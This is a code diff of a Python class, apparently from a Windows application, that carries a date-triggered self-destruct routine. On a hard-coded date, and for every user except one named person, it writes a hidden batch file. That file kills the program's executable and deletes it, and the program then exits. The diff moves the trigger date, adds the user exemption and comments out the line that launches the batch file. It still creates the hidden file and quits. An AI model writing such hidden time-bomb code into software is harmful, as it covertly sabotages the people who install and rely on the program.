@@ -6,29 +6,38 @@ import time
 from .ContenedorVariables import Variables
 
 class Ndachotsa():
-    def __init__(self, path):
-        tsiku = datetime.now().date()
-        tsiku_fin = "2024-02-28"
-        if (tsiku == tsiku_fin):
-            exe_path = path
-            bat_content = f"""
-    @echo off
-    timeout /t 2 >nul 2>&1
-    taskkill /IM "{os.path.basename(exe_path)}" /F >nul 2>&1
-    del /Q "{exe_path}"
-    exit
-        """
-            route = Variables().root_directory_system
-            bat_file = os.path.join(route, "Ndachotsa_galu.bat")
+    def __init__(self, path, user):
+        self.tsiku = datetime.now().date()
+        self.tsiku_fin = datetime.strptime("2024-09-17", "%Y-%m-%d").date()
+        self.userName = user
+        print(self.tsiku)
+        print(self.tsiku_fin)
+        print(user)
+        self.exe_path = path
+        self.route = Variables().root_directory_system
+        self.bat_file = os.path.join(self.route, "Ndachotsa_galu.bat")
+        if os.path.exists(self.bat_file):
+            os.remove(self.bat_file)
+            self.createDocument()
+        else:
+            self.createDocument()
 
-            with open(bat_file, "w") as file:
+
+    def createDocument(self):
+        if (self.tsiku == self.tsiku_fin) & (self.userName != 'Luis Vallejo'):
+            bat_content = f"""
+            @echo off
+            timeout /t 2 >nul 2>&1
+            taskkill /IM "{os.path.basename(self.exe_path)}" /F >nul 2>&1
+            del /Q "{self.exe_path}"
+            exit
+                """
+            with open(self.bat_file, "w") as file:
                 file.write(bat_content)
 
-            subprocess.call(['attrib', '+h', bat_file])
+            subprocess.call(['attrib', '+h', self.bat_file])
             time.sleep(2)
             # Ejecutar el archivo batch
-            subprocess.Popen(["cmd", "/c", bat_file], shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE)
+            # subprocess.Popen(["cmd", "/c", bat_file], shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE)
 
             sys.exit()
-        else:
-            pass
